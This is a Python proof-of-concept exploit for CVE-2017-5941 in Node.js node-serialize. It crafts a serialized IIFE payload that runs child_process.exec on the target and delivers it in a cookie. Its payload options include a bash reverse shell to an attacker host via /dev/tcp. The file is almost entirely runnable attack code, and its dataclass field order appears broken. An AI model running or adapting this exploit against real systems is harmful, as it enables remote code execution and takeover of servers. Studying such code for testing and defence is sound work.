#!/usr/bin/env python3
"""
Node.js Deserialization RCE PoC
CVE: CVE-2017-5941 (node-serialize)
Target: Node.js applications using node-serialize on untrusted data
Vulnerability: Insecure deserialization → Remote Code Execution

Reference:
- https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
- https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/

Exploit Flow:
1. Identify node-serialize usage (cookies, session data)
2. Generate IIFE (Immediately Invoked Function Expression) payload
3. Serialize malicious function with _$$ND_FUNC$$_ wrapper
4. Trigger deserialization to execute function
5. Achieve RCE via child_process.exec()
"""

import argparse
import requests
import sys
import json
from dataclasses import dataclass, field
from typing import Optional
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

@dataclass(slots=True)
class ExploitContext:
    """Node.js deserialization exploit configuration and state."""

    target_ip: str
    target_port: int
    protocol: str = "http"
    endpoint: str = "/"
    param_name: str = "profile"

    attacker_ip: str
    attacker_port: int

    command_type: str = "ping"
    proxy: Optional[str] = None

    session: requests.Session = field(default_factory=requests.Session, repr=False)
    rce_confirmed: bool = field(default=False, repr=False)

    @classmethod
    def from_args(cls, args: argparse.Namespace) -> "ExploitContext":
        return cls(
            target_ip=args.target_ip,
            target_port=args.target_port,
            endpoint=args.endpoint,
            param_name=args.param_name,
            attacker_ip=args.listening_ip,
            attacker_port=args.listening_port,
            command_type=args.command,
            proxy=args.proxy,
        )

    def get_base_url(self) -> str:
        return f"{self.protocol}://{self.target_ip}:{self.target_port}"

    def get_target_url(self) -> str:
        return f"{self.get_base_url()}{self.endpoint}"

    def get_proxies(self) -> Optional[dict]:
        if self.proxy:
            return {"http": self.proxy, "https": self.proxy}
        return None

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Node.js Deserialization RCE PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    target_group = parser.add_argument_group("Target Configuration")
    target_group.add_argument("target_ip", help="Target IP address")
    target_group.add_argument("target_port", type=int, help="Target port")
    target_group.add_argument("--endpoint", default="/", help="Vulnerable endpoint")
    target_group.add_argument("--param-name", default="profile", help="Cookie/parameter name")

    attacker_group = parser.add_argument_group("Attacker Configuration")
    attacker_group.add_argument("listening_ip", help="Attacker IP")
    attacker_group.add_argument("listening_port", type=int, help="Attacker port")

    exploit_group = parser.add_argument_group("Exploit Configuration")
    exploit_group.add_argument("--command", choices=["ping", "reverse_shell"], default="ping")

    optional_group = parser.add_argument_group("Optional")
    optional_group.add_argument("--proxy", help="HTTP proxy")

    return parser.parse_args()

def generate_iife_payload(ctx: ExploitContext) -> str:
    """Generate IIFE payload for node-serialize."""

    if ctx.command_type == "ping":
        cmd = f"require('child_process').exec('ping -c 4 {ctx.attacker_ip}')"
    else:  # reverse_shell
        cmd = f"require('child_process').exec('bash -c \"bash -i >& /dev/tcp/{ctx.attacker_ip}/{ctx.attacker_port} 0>&1\"')"

    # IIFE wrapper for immediate execution
    iife = f"_$$ND_FUNC$$_function (){{{cmd}}}()"

    # Wrap in JSON object
    payload_obj = {"rce": iife}
    payload = json.dumps(payload_obj)

    return payload

def stage_recon(ctx: ExploitContext) -> bool:
    print("\n[*] Stage 1: Reconnaissance")

    try:
        response = ctx.session.get(ctx.get_target_url(), proxies=ctx.get_proxies(), timeout=10, verify=False)
        print(f"[+] Target is reachable (HTTP {response.status_code})")

        # Check for Node.js indicators
        if "X-Powered-By" in response.headers:
            if "Express" in response.headers["X-Powered-By"]:
                print(f"[+] Express.js detected: {response.headers['X-Powered-By']}")

        return True
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return False

def stage_exploit(ctx: ExploitContext) -> bool:
    print("\n[*] Stage 2: Exploitation")

    payload = generate_iife_payload(ctx)
    print(f"[*] Generated IIFE payload:")
    print(f"    {payload[:100]}...")

    try:
        # Send as cookie (most common vector)
        cookies = {ctx.param_name: payload}
        response = ctx.session.get(
            ctx.get_target_url(),
            cookies=cookies,
            proxies=ctx.get_proxies(),
            timeout=15,
            verify=False
        )

        print(f"[+] Payload delivered (HTTP {response.status_code})")

        if "error" in response.text.lower() or "function" in response.text.lower():
            print("[+] Deserialization may have occurred")

        return True
    except Exception as e:
        print(f"[-] Exploitation failed: {e}")
        return False

def main():
    print("[+] Node.js Deserialization RCE PoC")

    args = parse_args()
    ctx = ExploitContext.from_args(args)

    print(f"\n[*] Configuration:")
    print(f"    Target: {ctx.get_target_url()}")
    print(f"    Command: {ctx.command_type}")

    try:
        if not stage_recon(ctx):
            sys.exit(1)

        if not stage_exploit(ctx):
            sys.exit(1)

        print("\n[+] Exploitation completed")
        print(f"[!] Monitor for callbacks from {ctx.target_ip}")

    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        sys.exit(1)

if __name__ == "__main__":
    main()
